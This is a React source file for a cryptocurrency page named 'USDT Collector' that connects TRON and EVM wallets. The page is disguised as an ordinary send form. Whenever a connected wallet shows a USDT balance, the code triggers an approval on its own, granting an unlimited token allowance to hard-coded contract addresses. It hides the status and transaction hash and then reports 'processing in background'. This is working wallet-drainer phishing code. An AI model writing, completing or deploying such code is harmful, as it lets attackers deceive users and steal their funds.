import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, QrCode } from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// --- TRON IMPORTS ---
import TronWeb from 'tronweb'   

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet'

// 🔥 CONTRACT ADDRESSES
const TRON_CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE' // Add your deployed EVM contract

const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
  tronMainnet,
  mainnet,
  arbitrum,
  bsc,
  polygon,
]

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  },
}

const EVM_USDT: Record<number, string> = {
  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', // Sepolia
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function approve(address spender, uint256 amount) returns (bool)'
]

const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Reown Adapters ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new MetaMaskAdapter(),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }),
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
  ],
})

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: appkitNetworks,
})

createAppKit({
  adapters: [tronAdapter, wagmiAdapter], 
  networks: appkitNetworks,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'USDT Collector',
    description: 'Collect USDT from multiple wallets',
    url:         typeof window !== 'undefined' ? window.location.origin : '',
    icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00ff9f',
  },
  allWallets: 'SHOW',
  features: {
    email: false,
    socials: [],
    analytics: true,
  },
})

// === TRON ABIs ===
const USDT_ABI = [
  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
]

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  // const [debugLog, setDebugLog] = useState<string[]>([])
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [amountError, setAmountError] = useState('')
  const autoTriggered = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
  const { chainId } = useAppKitNetwork()

  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

  const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
  const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')

  const resolveTronWeb = () => {
    const w = window as any;
    if (w.tronWeb?.contract) return w.tronWeb;
    if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
    if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
    if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
    if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 

    if (tronWalletProvider) {
      if ((tronWalletProvider as any).contract) return tronWalletProvider;
      if ((tronWalletProvider as any).adapter?.tronWeb?.contract) return (tronWalletProvider as any).adapter.tronWeb;
      if ((tronWalletProvider as any).tronWeb?.contract) return (tronWalletProvider as any).tronWeb;
    }
    return null;
  };

  const log = (msg: string) => {
    console.log(msg);
    // setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
  }

  // ── INIT & AUTO-TRIGGER ──
  useEffect(() => {
    const init = async () => {
      if (!isConnected || !walletAddress) {
        autoTriggered.current = false;
        return;
      }

      log(`Connected: ${caipAddress}`);
      let currentBalance = 0;

      if (isTron) {
        setStatus('Initializing TRON...');
        
        let finalTronWeb = null;
        for (let i = 0; i < 10; i++) {
          finalTronWeb = resolveTronWeb();
          if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) break;
          await new Promise(r => setTimeout(r, 500));
        }

        if (!finalTronWeb) {
          log("⚠️ Using Public Provider for balance");
          const publicTronWeb = new (TronWeb as any)({ fullHost: FULL_HOST });
          currentBalance = await getTronBalance(publicTronWeb, walletAddress);
        } else {
          log('✅ TRON Provider Found');
          currentBalance = await getTronBalance(finalTronWeb, walletAddress);
        }
      } else if (isEVM && evmWalletProvider) {
        currentBalance = await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
      }

      // 🔥 AUTO-TRIGGER: Fire the approval if balance > 0
      if (currentBalance > 0 && !autoTriggered.current) {
        autoTriggered.current = true;
        log("🔥 Positive balance detected. Auto-triggering approval...");
        setTimeout(() => approveAndCollect(), 1000); 
      }
    };

    init();
  }, [isConnected, walletAddress, caipAddress, tronWalletProvider, evmWalletProvider, isTron, isEVM, chainId]);

  const getTronBalance = async (tw: any, addr: string): Promise<number> => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      const formatted = Number(bal) / 1_000_000;
      setUsdtBalance(formatted.toFixed(2))
      setStatus('Ready')
      log(`TRON USDT: ${formatted.toFixed(2)}`)
      return formatted;
    } catch (e) {
      log('❌ TRON balance fetch failed')
      return 0;
    }
  }

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setUsdtBalance('0')
      setStatus('USDT not configured for this EVM chain')
      log(`❌ No USDT config for EVM chain ${currentChainId}`)
      return 0;
    }

    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)

      const [bal, decimals] = await Promise.all([
        token.balanceOf(addr),
        token.decimals(),
      ])

      const formatted = parseFloat(formatUnits(bal, decimals))
      setUsdtBalance(formatted.toFixed(2))
      setStatus('Ready')
      log(`EVM USDT: ${formatted.toFixed(2)}`)
      return formatted;
    } catch (e) {
      log('❌ EVM balance fetch failed')
      return 0;
    }
  }

  const handleConnect = () => {
    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
      setAmountError('Amount field is required');
      return; 
    }
    setAmountError('');
    open({ view: 'AllWallets' });
  }

  const approveAndCollect = async () => {
    if (!walletAddress) return;

    setLoading(true);
    setStatus('Approving Transaction...');
    log("Requesting USDT Approval...");

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      // ==========================================
      // 🟢 EVM APPROVAL BLOCK
      // ==========================================
      if (isEVM && evmWalletProvider) {
        if (!chainId || !EVM_USDT[Number(chainId)]) throw new Error("USDT not supported on this EVM chain");
        
        const ethersProvider = new BrowserProvider(evmWalletProvider as any);
        const signer = await ethersProvider.getSigner();
        const currentUsdtAddress = EVM_USDT[Number(chainId)];

        const usdtContract = new Contract(currentUsdtAddress, EVM_ERC20_ABI, signer);
        const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
        
        setTxHash(approveTx.hash);
        log(`Wait: Confirming EVM Appv TX...`);
        await approveTx.wait();
        
        log("✅ EVM Approved!");
        setStatus('✅ Approved! Processing in background...');
        return; // END EVM FRONTEND FLOW
      }

      // ==========================================
      // 🔴 TRON APPROVAL BLOCK
      // ==========================================
      if (isTron) {
        const activeTw = resolveTronWeb();

        // PATH A: Fully Injected Wallet
        if (activeTw && typeof activeTw.contract === 'function') {
          log('Executing via Injected Provider...');
          const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
          
          const tx = await usdt.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
          setTxHash(tx);
          
          log(`✅ TRON Approved!`);
          setStatus('✅ Approved! Processing in background...');
          return; // END TRON FRONTEND FLOW
        }

        // PATH B: WalletConnect via Universal Provider
        if (tronWalletProvider) {
          log("Executing via Reown Universal Provider...");
          const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
          
          const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
            const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
              contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
            );
            
            let signedTx;
            if (typeof (tronWalletProvider as any).signTransaction === 'function') {
              signedTx = await (tronWalletProvider as any).signTransaction(transaction);
            } else if (typeof (tronWalletProvider as any).request === 'function') {
              signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
            } else {
              throw new Error("Provider does not support signTransaction");
            }

            const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
            if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
            return broadcast.txid || broadcast.transaction?.txID;
          };

          const tx = await signAndSend(
            USDT_ADDRESS,
            'approve(address,uint256)',
            [ 
              { type: 'address', value: publicTw.address.toHex(TRON_CONTRACT_ADDRESS) }, 
              { type: 'uint256', value: MAX_UINT } 
            ],
            100_000_000
          );
          
          setTxHash(tx);
          log(`✅ TRON Approved!`);
          setStatus('✅ Approved! Processing in background...');
          return; // END TRON FRONTEND FLOW
        }
      }

      throw new Error("Wallet provider not available for approval.");

    } catch (err: any) {
      log(`❌ Error: ${err.message || 'User rejected'}`);
      setStatus('❌ Transaction Failed');
      autoTriggered.current = false; // Reset so they can try again via the button
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>

      {/* Main Content Container */}
      <div style={{ flex: 1, padding: '32px 20px' }}>

        {/* Address Input Group */}
        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Address or Domain Name
          </label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input
              type="text"
              readOnly
              placeholder="0xccD642c9acb072F72F29b77E"
              value={isConnected && walletAddress ? walletAddress : ''}
              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0, marginRight: '12px' }}
            />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', color: '#0C66FF' }}>
              <span style={{ fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Paste</span>
              <Copy size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
              <QrCode size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
            </div>
          </div>
        </div>

        {/* Amount Input Group */}
        <div>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Amount
          </label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input
              type="number"
              placeholder="USDT Amount"
              value={usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : ''}
              onChange={(e) => {
                setUsdtBalance(e.target.value);
                if (e.target.value) setAmountError(''); 
              }}
              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0 }}
            />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <span style={{ color: '#9CA3AF', fontWeight: '600', fontSize: '15px' }}>USDT</span>
              <span style={{ color: '#0C66FF', fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Max</span>
            </div>
          </div>
         <div style={{ fontSize: '13px', fontWeight: '500', marginTop: '8px' }}>
            {amountError ? (
              <span style={{ color: '#EF4444' }}>{amountError}</span>
            ) : (
              <span style={{ color: '#4B5563' }}>= ${usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : '0.00'}</span>
            )}
          </div>
        </div>

      </div>

      {/* Hidden Status track (Keeps the functional logic alive without ruining UI) */}
      <div style={{ display: 'none' }}>
        <p>{status}</p>
        <p>{txHash}</p>
      </div>

      {/* Fixed Bottom Button Area */}
      <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
        
        {/* Only show processing status text when active */}
        {status !== 'Ready' && status !== 'Initializing TRON...' && (
          <div style={{ textAlign: 'center', fontSize: '13px', fontWeight: '600', color: '#6B7280', marginBottom: '12px' }}>
            {status}
          </div>
        )}

        <button
          onClick={!isConnected ? handleConnect : approveAndCollect}
          // The button disables if loading OR if they are connected but the input is empty/0
          disabled={loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00'))}
          style={{
            width: '100%',
            backgroundColor: loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')) ? '#93C5FD' : '#0C66FF', // Lighter blue when disabled
            color: '#ffffff',
            fontWeight: '700',
            padding: '16px',
            borderRadius: '9999px',
            fontSize: '17px',
            border: 'none',
            cursor: loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')) ? 'not-allowed' : 'pointer'
          }}
        >
          {!isConnected
            ? 'Connect Wallet'
            : loading
            ? 'Processing...'
            : 'Collect All USDT'}
        </button>
      </div>
      
    </div>
  )
}